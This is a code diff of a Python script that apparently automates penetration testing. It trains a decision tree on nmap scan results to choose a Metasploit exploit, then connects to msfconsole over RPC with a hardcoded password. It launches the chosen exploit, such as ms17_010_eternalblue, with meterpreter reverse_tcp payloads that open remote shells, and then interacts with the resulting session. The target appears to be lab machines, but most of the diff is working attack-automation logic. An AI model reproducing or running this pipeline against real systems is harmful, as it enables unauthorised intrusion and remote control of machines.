@@ -320,14 +320,24 @@ def predictExploit(machineInfo):
     #clf = DecisionTreeClassifier(criterion="entropy", max_depth=3)
     # Train Decision Tree Classifer
     clf = clf.fit(X_train,y_train)
+    generateDecisionTreeImage(clf, one_hot_data, autopen_data)
     print(X_test)
     print(X_test['port_1099'])
     print("masina", machineInfo)
-    print(X_test['port_' + machineInfo[0]])
-    for i in X_test:
-        print(i)
-    if X_test['port_' + machineInfo[0]] == 1 and X_test['service_' + machineInfo[1]] == 1 and X_test['cve_' + machineInfo[2]] == 1 and X_test['os_' + machineInfo[3]] == 1:
-        y_pred = clf.predict(X_test)
+    # print(X_test['port_' + machineInfo[0]])
+    # result = [print(x) for x in X_test['port_' + machineInfo[0]]]
+    portPredict = 'port_' + machineInfo[0]
+    servicePredict = 'service_' + machineInfo[1]
+    cvePredict = 'cve_' + machineInfo[2]
+    osPredict = 'os_' + machineInfo[3]
+    prediction = []
+    if (portPredict in X_test.columns) & (servicePredict in X_test.columns) & (cvePredict in X_test.columns) & (osPredict in X_test.columns):# & (X_test['service_' + machineInfo[1]]):
+        rows = X_test.loc[(X_test[portPredict] == 1) & (X_test[servicePredict] == 1) & (X_test[osPredict] == 1)]
+        print("-------Rows:\n", rows)
+        prediction = clf.predict(rows)
+        #print(prediction)
+    # if X_test['port_' + machineInfo[0]] == 1 and X_test['service_' + machineInfo[1]] == 1 and X_test['cve_' + machineInfo[2]] == 1 and X_test['os_' + machineInfo[3]] == 1:
+    y_pred = clf.predict(X_test)
     #prediction = clf.predict(x)
     #445,microsoft-ds,CVE-2017-0143,windows/smb/ms17_010_psexec,windows
     #prediction = clf.predict([[0,0,0,1,1,0,0,0,0,1,0,1]])
@@ -339,10 +349,10 @@ def predictExploit(machineInfo):
     print("Accuracy:", round(score, 1), "%")
     print(confusion_matrix(y_test, y_pred))
     print(classification_report(y_test, y_pred))
-    #return y_pred
+    return prediction
 
 
-def generateDecisionTreeImage(clf):
+def generateDecisionTreeImage(clf, one_hot_data, autopen_data):
     tree.plot_tree(clf)
     #dot_data = tree.export_graphviz(clf, out_file=None, feature_names=list(one_hot_data.columns.values))
     dot_data = tree.export_graphviz(clf, out_file=None,
@@ -351,7 +361,7 @@ def generateDecisionTreeImage(clf):
                                     class_names=autopen_data['exploit'].unique())
     print(dot_data)
     graph = graphviz.Source(dot_data)
-    graph.render("test")
+    graph.render("testing")
 
     # pydot_graph = pydotplus.graph_from_dot_data(dot_data)
     # Image(pydot_graph.create_png())
@@ -362,6 +372,8 @@ def workflow():
     #cleanTemporaryFiles()
     #Run nmap on machine
     #runNmap()
+    # Initialize msfconsole
+    client = MsfRpcClient('1337hax0r', port=55552)
     #Get CVEs
     cveList = getCVEsFromNmap()
     cveList = list(dict.fromkeys(cveList))
@@ -372,42 +384,82 @@ def workflow():
     #Search for exploits using searchsploit
     # exploitList = searchExploits(cveList)
     # print(exploitList)
-    # Initialize msfconsole
-    client = MsfRpcClient('1337hax0r', port=55552)
+    #Predict exploit
+    machineInfo = []
+    infoList = getPortAndServiceFromNmap()
+    print(infoList)
+    for i in infoList:
+        print(i)
+    cveList = getCVEsFromNmap()
+    cveList = list(dict.fromkeys(cveList))
+    print(cveList)
+    exploitList = []
+    #machine info = [port, service, CVE, os]
+    for cve in cveList:
+        for info in infoList:
+            if len(info) > 1:
+                #print(info[0]," ",info[1]," ",cve," ",getBoxOS(name))
+                machineInfo.append(info[0])
+                machineInfo.append(info[1])
+                machineInfo.append(cve)
+                machineInfo.append(getBoxOS(name))
+                print(machineInfo)
+                exploitList = predictExploit(machineInfo)
+                if exploitList:
+                    print("Exploit:\n", exploitList[0])
+                    exploit = client.modules.use("exploit", exploitList[0])
+                    #Set target
+                    try:
+                        exploit['RHOSTS'] = getBoxIP(name)
+                    except KeyError:
+                        exploit['RHOST'] = getBoxIP(name)
+                    if getBoxOS(name) == "Windows":
+                        if exploitList[0] in ["windows/smb/ms17_010_eternalblue", "windows/smb/smb_doublepulsar_rce"]:
+                            payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+                        else:
+                            payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+                    elif getBoxOS(name) == "Linux":
+                        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
+                    #Set our IP
+                    payload['LHOST'] = 'tun0'
+                    #Run the exploit
+                    exploit.execute(payload=payload)
+                    time.sleep(20)
+            machineInfo = []
     #Search for exploits in msfconsole
     # for cve in cveList:
     #     os.system('msfconsole -x "search "' + cve + ' >> ' + name.box + '.exploits&')
     #     time.sleep(15)
     #Extract them from file
-    exploitList = getExploitsFromMsf()
-    for exploit in exploitList:
-        x = exploit.split("/")
-        exploitType = x[0]
-        if x[0] != "auxiliary":
-            exploitName = exploit.replace(exploitType + "/", "")
-            print(exploitName)
-            #Select exploit
-            exploit = client.modules.use(exploitType, exploitName)
-            #Set target
-            try:
-                exploit['RHOSTS'] = getBoxIP(name)
-            except KeyError:
-                exploit['RHOST'] = getBoxIP(name)
-            #Choose payload to use
-            #print(exploit.targetpayloads())
-            predictExploit(machineInfo)
-            if getBoxOS(name) == "Windows":
-                if exploitName in ["windows/smb/ms17_010_eternalblue", "windows/smb/smb_doublepulsar_rce"]:
-                    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
-                else:
-                    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
-            elif getBoxOS(name) == "Linux":
-                payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-            #Set our IP
-            payload['LHOST'] = 'tun0'
-            #Run the exploit
-            exploit.execute(payload=payload)
-            time.sleep(20)
+    # exploitList = getExploitsFromMsf()
+    # for exploit in exploitList:
+    #     x = exploit.split("/")
+    #     exploitType = x[0]
+    #     if x[0] != "auxiliary":
+    #         exploitName = exploit.replace(exploitType + "/", "")
+    #         print(exploitName)
+    #         #Select exploit
+    #         exploit = client.modules.use(exploitType, exploitName)
+    #         #Set target
+    #         try:
+    #             exploit['RHOSTS'] = getBoxIP(name)
+    #         except KeyError:
+    #             exploit['RHOST'] = getBoxIP(name)
+    #         #Choose payload to use
+    #         #print(exploit.targetpayloads())
+    #
+    #         if getBoxOS(name) == "Windows":
+    #             if exploit[0] in ["windows/smb/ms17_010_eternalblue", "windows/smb/smb_doublepulsar_rce"]:
+    #                 payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+    #             else:
+    #                 payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
+    #         elif getBoxOS(name) == "Linux":
+    #             payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
+    #         #Set our IP
+    #         payload['LHOST'] = 'tun0'
+    #         #Run the exploit
+    #         exploit.execute(payload=payload)
+    #         time.sleep(20)
     print(client.sessions.list)
     #Interact with the newly opened session
     shell = client.sessions.session(list(client.sessions.list.keys())[0])
@@ -440,30 +492,9 @@ elif name.action == "remove":
     controlBox(name, "remove")
 #printAllBoxes()
 # selectExploit()
-machineInfo = []
-infoList = getPortAndServiceFromNmap()
-print(infoList)
-for i in infoList:
-    print(i)
-cveList = getCVEsFromNmap()
-cveList = list(dict.fromkeys(cveList))
-print(cveList)
-#machine info = [port, service, CVE, os]
-for cve in cveList:
-    for info in infoList:
-        if len(info) > 1:
-            #print(info[0]," ",info[1]," ",cve," ",getBoxOS(name))
-            machineInfo.append(info[0])
-            machineInfo.append(info[1])
-            machineInfo.append(cve)
-            machineInfo.append(getBoxOS(name))
-            print(machineInfo)
-            exploit = predictExploit(machineInfo)
-            print(exploit)
-        machineInfo = []
 #exploit = predictExploit(machineInfo)
 #print(exploit)
-#workflow()
+workflow()
 
 # productList = []
 # with open('nmapOutput.csv', newline='') as csvfile:
